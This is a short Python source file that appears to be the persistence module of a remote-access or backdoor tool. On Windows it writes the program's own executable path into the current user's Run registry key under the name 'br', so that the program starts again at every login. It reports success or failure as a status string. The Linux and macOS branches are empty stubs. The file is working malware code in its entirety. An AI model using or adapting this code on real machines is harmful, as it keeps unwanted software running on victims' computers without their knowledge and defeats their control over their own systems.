# -*- coding: utf-8 -*-
import sys
def windows_persistence():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable
    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
        _winreg.CloseKey(reg_key)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def linux_persistence():
    return False, 'nothing here yet'
def mac_persistence():
    return False, 'nothing here yet'
def run(plat_type):
    if plat_type.startswith('win'):
        success, details = windows_persistence()
    elif plat_type.startswith('linux'):
        success, details = linux_persistence()
    elif plat_type.startswith('darwin'):
        success, details = mac_persistence()
    else:
        return 'Error, platform unsupported.'
    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)
    return results
